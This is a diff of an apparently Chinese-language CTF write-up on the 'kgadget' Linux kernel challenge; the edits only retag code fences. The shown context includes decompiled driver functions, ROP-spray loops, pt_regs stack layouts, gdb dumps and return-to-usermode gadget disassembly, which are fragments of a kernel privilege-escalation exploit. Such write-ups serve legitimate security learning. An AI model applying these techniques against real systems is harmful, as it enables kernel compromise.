@@ -15,7 +15,7 @@ draft: false
 
 ### 1.kgadget_ioctl
 
-```kgadget_ioctl
+```text
 __int64 __fastcall kgadget_ioctl(file *__file, unsigned int cmd, unsigned __int64 param)
 {
   void (__fastcall **v3)(void *, _QWORD); // rdx
@@ -54,7 +54,7 @@ __`__fentry__`__是内核`ftrace`函数追踪的入口钩子，分析时可以�
 
 * qmemcpy的操作有些迷惑，看不太懂
 
-```asm
+```text
 .text.unlikely:000000000000011C                 mov     rbx, [param]
 .text.unlikely:000000000000011F kgadget_ptr = rbx                       ; void (*)(void)
 .text.unlikely:000000000000011F                 mov     __file, offset unk_370
@@ -131,7 +131,7 @@ __int64 __fastcall kgadget_write(__int64 a1, __int64 a2)
 
 ### 3.kgadget_read
 
-```kgadget_read
+```text
 ssize_t __fastcall kgadget_read(file *__file, char *user_buf, size_t size, loff_t *__loff)
 {
   _fentry__(__file, user_buf);
@@ -152,7 +152,7 @@ ssize_t __fastcall kgadget_read(file *__file, char *user_buf, size_t size, loff_
 
 ### 4.kgadget_open
 
-```kgadget_open
+```text
 int __fastcall kgadget_open(inode *__inode, file *__file)
 {
   _fentry__(__inode, __file);
@@ -181,7 +181,7 @@ int __fastcall kgadget_open(inode *__inode, file *__file)
 
 利用这个`gadget`偏移到`pt_regs`内跳到`r9 = pop rsp ; ret`，`r8 = try_hit`
 
-```c
+```text
 for(;idx < (page_size/8 - 0x30);idx++){
         rop[idx]=add_rsp_a0_pop_rbx_r12_r13_rbp_ret;
     }
@@ -189,7 +189,7 @@ for(;idx < (page_size/8 - 0x30);idx++){
 
 保证了`rsp`的步长
 
-```c
+```text
 for(;idx < (page_size/8 - 0x10);idx++){
         rop[idx]=ret;
     }
@@ -203,7 +203,7 @@ for(;idx < (page_size/8 - 0x10);idx++){
 
 ## 三.Exploit
 
-```c
+```text
 #include <stdio.h>
 #include <sys/mman.h>
 #include <unistd.h>
@@ -297,7 +297,7 @@ int main(int argc,char **argv){
 
 **`pt_regs`有着0xa8字节位于内核栈的最高地址端**
 
-```pt_regs
+```text
 struct pt_regs {
 /*  偏移      字段        */
     unsigned long r15;      /* 0x00 */
@@ -331,7 +331,7 @@ struct pt_regs {
 
 > kadget中找到pt_regs的方式` 
 
-```asm
+```text
 .text.unlikely:000000000000013A                 mov     [rbp-18h], rsp
 .text.unlikely:000000000000013E                 mov     rax, [rbp-18h]
 .text.unlikely:0000000000000142                 mov     rdi, offset unk_3F8
@@ -361,7 +361,7 @@ pwndbg> x/40gx 0xffffc9000018ff58
 
 ```
 
-```struct
+```text
 0xffffc90000190000          ← 页边界（x/40gx 显示 Cannot access，因为这是栈顶）
 0xffffc9000018fff8  +0xa0   ss        = 0x2b
 0xffffc9000018fff0  +0x98   rsp       = 0x7ffc4872b7e0
@@ -388,7 +388,7 @@ pwndbg> x/40gx 0xffffc9000018ff58
 
 ### 2.swapgs_restore_regs_and_return_to_usermode
 
-```return to usermod
+```text
 * pwndbg> x/30i  0xffffffff81c00fb0 
    0xffffffff81c00fb0:	nop    DWORD PTR [rax+rax*1+0x0]
    0xffffffff81c00fb5:	pop    r15
@@ -481,6 +481,7 @@ pwndbg> x/40gx 0xffffc9000018ff58
   `grep -B2 -A2 'iretq' gadgets.txt | grep -B5 'swapgs'`
 
 > 那么我是如何在`kgadget`中找到它的呢？`gdb`崩溃的时候它正好在附近，莫名奇妙的
+
 
 
 
